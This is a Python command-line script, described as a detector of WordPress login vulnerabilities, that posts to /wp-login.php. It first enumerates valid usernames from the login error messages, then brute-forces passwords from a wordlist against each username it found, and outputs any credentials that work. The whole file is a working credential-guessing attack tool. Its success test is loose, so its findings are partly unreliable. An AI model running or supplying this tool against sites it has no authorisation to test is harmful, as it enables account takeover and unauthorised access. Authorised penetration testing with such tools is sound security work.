import requests
import argparse
import json
from typing import List, Dict

# Load usernames and passwords from file
def load_list(file_path: str) -> List[str]:
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

# Detect user enumeration based on login error messages
def detect_user_enumeration(base_url: str, usernames: List[str]) -> Dict:
    endpoint = base_url.rstrip("/") + "/wp-login.php"
    found_users = []

    for username in usernames:
        data = {
            "log": username,
            "pwd": "incorrectPassword123!",
            "wp-submit": "Log In",
            "redirect_to": base_url,
            "testcookie": "1"
        }
        try:
            resp = requests.post(endpoint, data=data, timeout=5)
            if "Invalid username" not in resp.text:
                found_users.append(username)
        except requests.RequestException as e:
            print(f"[!] Error contacting {endpoint}: {e}")

    return {
        "type": "User Enumeration",
        "detected": bool(found_users),
        "vector": "/wp-login.php",
        "confidence": "medium" if found_users else "low",
        "found_usernames": found_users
    }

# Try brute-force login on valid usernames
def detect_brute_force(base_url: str, usernames: List[str], passwords: List[str]) -> Dict:
    endpoint = base_url.rstrip("/") + "/wp-login.php"
    credentials_found = []

    for username in usernames:
        for password in passwords:
            data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": base_url,
                "testcookie": "1"
            }
            try:
                resp = requests.post(endpoint, data=data, timeout=5)
                if "dashboard" in resp.url or "wp-admin" in resp.url or "incorrect password" not in resp.text:
                    credentials_found.append({"username": username, "password": password})
                    break  # Stop after first success for each user
            except requests.RequestException as e:
                print(f"[!] Error during brute-force: {e}")

    return {
        "type": "Brute-force Login",
        "detected": bool(credentials_found),
        "vector": "/wp-login.php",
        "usernames_tested": usernames,
        "credentials_found": credentials_found,
        "confidence": "high" if credentials_found else "low"
    }

# Main function
def main():
    parser = argparse.ArgumentParser(description="Detect WordPress login vulnerabilities")
    parser.add_argument("url", help="Base URL of the WordPress site (e.g., http://localhost/wordpress)")
    parser.add_argument("--usernames", default="usernames.txt", help="Username wordlist file")
    parser.add_argument("--passwords", default="passwords.txt", help="Password wordlist file")
    args = parser.parse_args()

    base_url = args.url
    usernames = load_list(args.usernames)
    passwords = load_list(args.passwords)

    enum_result = detect_user_enumeration(base_url, usernames)
    if enum_result["detected"]:
        brute_result = detect_brute_force(base_url, enum_result["found_usernames"], passwords)
    else:
        brute_result = {
            "type": "Brute-force Login",
            "detected": False,
            "vector": "/wp-login.php",
            "usernames_tested": [],
            "credentials_found": [],
            "confidence": "low"
        }

    output = {
        "target": base_url,
        "vulnerabilities": [enum_result, brute_result]
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
